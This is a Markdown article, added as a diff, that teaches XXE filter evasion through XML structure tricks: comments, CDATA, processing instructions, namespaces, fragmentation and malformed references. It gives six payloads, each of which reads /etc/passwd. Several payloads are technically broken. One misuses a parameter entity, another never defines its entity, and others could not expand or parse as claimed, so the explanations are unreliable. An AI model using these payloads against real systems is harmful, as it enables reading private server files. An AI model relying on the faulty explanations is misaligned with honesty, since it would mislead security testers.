@@ -1,0 +1,94 @@
+---
+title: 'XML Structure Bypasses: Evasion Techniques for XXE'
+description: Learn advanced XML structure techniques to bypass security controls,
+  evading XXE payload detection with comprehensive examples and guidance.
+keywords:
+- XML Structure Bypasses
+- XXE vulnerabilities
+- XML comments
+- CDATA section
+- namespace manipulation
+- processing instructions
+- XML fragmentation
+---
+
+# XML Structure Bypasses
+
+## Context
+
+This article explores advanced techniques to bypass security controls and exploit vulnerabilities within XML parsers. By leveraging structure-based techniques, attackers can evade security mechanisms and deliver malicious XXE payloads. A thorough understanding of XML structure, XML parsing mechanisms, and XML entity concepts is assumed, as well as familiarity with the basics of XML External Entity (XXE) exploitation.
+
+## Theory
+
+### Structural Weaknesses in XML Parsing
+
+XML structure bypasses take advantage of the flexibility inherent in XML parsing to evade security controls or filters. These techniques exploit the fact that many filters only check for known patterns and may miss obfuscated or fragmented XML structures. By altering the XML structure, attackers can bypass naive validation processes, enabling the delivery of XXE payloads without detection.
+
+### Bypass Techniques Using XML Structure
+
+Attackers use various XML syntax manipulations—including comments, CDATA sections, namespaces, and processing instructions—to evade detection mechanisms. This may involve injecting comments or CDATA sections to split malicious payloads and confuse pattern-based filters. Additionally, processing instructions or namespace tricks can hide or reformat entities to bypass certain controls.
+
+### Examples of Structure-Based Evasion
+
+- **XML Comments**: Using `<!-- -->` to break up keywords or entity declarations, thereby evading detection.
+- **CDATA Sections**: Wrapping payloads in `<![CDATA[]]>` to shield special characters from filters.
+- **Processing Instructions**: Inserting `<?xml ...?>` instructions disrupts parsing or filter logic.
+- **Namespace Manipulation**: Redefining or obfuscating namespaces helps evade entity detection by filters.
+- **Fragmented XML**: Splitting payloads across multiple tags or sections circumvents regex-based filters.
+- **Well-formedness/Validity Bypass**: Exploiting parser leniency for accepting malformed but well-formed XML.
+
+## Practice
+
+### XML Comment Injection Bypass
+
+- **Payload**:
+  ```xml
+  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> ]><!--XXE--><foo>&xxe;</foo>
+  ```
+- **Explanation**: This technique involves injecting a comment to split or obfuscate the entity declaration, bypassing filters that look for contiguous entity patterns.
+
+### CDATA Section Bypass
+
+- **Payload**:
+  ```xml
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo><![CDATA[&xxe;]]></foo>
+  ```
+- **Explanation**: Encapsulate the entity reference in a CDATA section to evade character-based filters blocking direct entity usage.
+
+### Processing Instruction Bypass
+
+- **Payload**:
+  ```xml
+  <?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><?proc instr?><foo>&xxe;</foo>
+  ```
+- **Explanation**: Inserting processing instructions aids in disrupting naive parsing or filter logic, confusing filters that do not expect such instructions.
+
+### Namespace Manipulation Bypass
+
+- **Payload**:
+  ```xml
+  <foo xmlns:evil="http://malicious/"><evil:bar>&xxe;</evil:bar></foo>
+  ```
+- **Explanation**: By obfuscating the entity reference with a custom namespace, this approach bypasses filters that do not parse or validate namespaces.
+
+### XML Fragmentation Bypass
+
+- **Payload**:
+  ```xml
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&x<!-- -->xe;</foo>
+  ```
+- **Explanation**: Splitting an entity reference with a comment can evade pattern-matching filters expecting contiguous entity references.
+
+### Well-Formedness/Validity Constraint Bypass
+
+- **Payload**:
+  ```xml
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe</foo>
+  ```
+- **Explanation**: Introducing minor malformations, such as omitting the semicolon of an entity reference, exploits parser-specific quirks to bypass strict validation.
+
+## Tools
+
+- **Burp Suite**
+- **curl**
+- **Postman**
